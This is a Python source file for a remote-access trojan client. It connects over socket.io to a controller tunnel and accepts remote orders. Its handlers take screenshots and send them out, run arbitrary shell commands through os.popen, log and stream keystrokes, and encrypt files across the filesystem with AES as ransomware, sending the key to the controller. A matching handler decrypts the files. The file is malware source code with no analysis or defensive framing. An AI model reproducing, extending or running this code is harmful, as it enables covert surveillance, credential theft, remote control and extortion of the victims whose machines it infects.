import socketio
import pyautogui
import base64
import os
from tun import tunnel
from pynput.keyboard import Key, Listener
from aes import Aes
import hashlib
sio = socketio.Client()


@sio.event
def connect():
    print("I'm connected!")


@sio.on("screen")
def on_screen(data):
    pyautogui.screenshot().save("screen" + '.jpeg')
    with open("screen.jpeg", "rb") as img_file:
        res = base64.b64encode(img_file.read()).decode('utf-8')
        return sio.emit("image", {"image": True, "buffer": res})
    os.remove("screen.jpeg")

@sio.on("command")
def on_command(data):
    res = os.popen(data).readlines()
    return sio.emit("stdout", res)


@sio.on("keylog")
def on_key(data):
    global d 
    d = data
    
    
    def on_press(key):
        if d == 'start':
            sio.emit("key",str(key))
    
    def on_release(key):
        if d == 'stop':
            return False
    with Listener(on_press=on_press,on_release=on_release) as listener:
        listener.join()
        

    
@sio.on("ransom")
def on_ransomware(data):
    res = data['password']
    key = hashlib.sha256(res.encode()).digest()
    enc = Aes(key)
    sio.emit("key", {"password": res, "key": key})
    rep = os.path.abspath(os.sep)
    for user  in rep:
        for root, dirs, files in os.walk(user):
            for file in files:
                myFiles=["client.exe",'aes.py','client.py']
                if not(file in myFiles):
                    for ext in file.split('.'):
                        if (file.endswith(ext)):
                            myExt = ['py', 'pyc', 'pyd','h','enc']
                        if not(ext in myExt):
                            try:
                                fullPath = os.path.join(root,file)
                                enc.encryptFile(fullPath)
                            except:
                                    pass
                               
@sio.on('killRansom')
def on_kill(data):
    res = data['password']
    key = hashlib.sha256(res.encode()).digest()
    enc = Aes(key)
    rep = os.path.abspath(os.sep)
    for user  in rep:
        for root, dirs,files in os.walk(user):
            for file in files:
                if file.endswith(".enc"):
                    fullPath = os.path.join(root,file)
                    enc.decrypt_file(fullPath)
    

                                



sio.connect(tunnel)
sio.wait()